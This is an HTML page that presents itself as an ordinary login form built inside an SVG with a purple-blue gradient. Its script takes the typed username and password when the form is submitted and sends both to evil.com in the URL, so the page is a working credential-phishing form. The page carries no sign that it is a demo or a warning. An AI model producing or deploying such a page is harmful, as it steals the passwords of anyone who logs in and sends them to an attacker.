<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SVG Login Form</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(45deg, #b636c2, #4c68cf, #f69cea);
            background-size: cover;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
        }
    </style>
    <script>
        function handleLogin(event) {
            event.preventDefault();
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            window.location.href = `https://evil.com/?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`;
        }
    </script>
</head>
<body>
    <svg width="400" height="300" xmlns="http://www.w3.org/2000/svg">
        <defs>
            <linearGradient id="backgroundGradient" x1="0" x2="1" y1="0" y2="0">
                <stop offset="0%" stop-color="#b636c2"/>
                <stop offset="50%" stop-color="#4c68cf"/>
                <stop offset="100%" stop-color="#f69cea"/>
            </linearGradient>
        </defs>
        <rect width="100%" height="100%" fill="url(#backgroundGradient)" />
        <foreignObject x="10" y="10" width="380" height="280">
            <div xmlns="http://www.w3.org/1999/xhtml" style="padding: 20px; background-color: rgba(255, 255, 255, 0.8); border-radius: 8px; box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);">
                <h2 style="text-align: center; color: #333;">Login</h2>
                <form onsubmit="handleLogin(event)" style="display: flex; flex-direction: column;">
                    <div style="margin-bottom: 15px;">
                        <label for="username" style="margin-bottom: 8px; color: #555;">Username:</label>
                        <input type="text" id="username" name="username" required style="padding: 8px; border: 1px solid #ccc; border-radius: 4px; font-size: 16px; width: calc(100% - 16px);"/>
                    </div>
                    <div style="margin-bottom: 15px;">
                        <label for="password" style="margin-bottom: 8px; color: #555;">Password:</label>
                        <input type="password" id="password" name="password" required style="padding: 8px; border: 1px solid #ccc; border-radius: 4px; font-size: 16px; width: calc(100% - 16px);"/>
                    </div>
                    <button type="submit" style="background-color: #4caf50; color: #fff; padding: 10px; border: none; border-radius: 4px; cursor: pointer; font-size: 16px;">
                        Login
                    </button>
                </form>
            </div>
        </foreignObject>
    </svg>
</body>
</html>
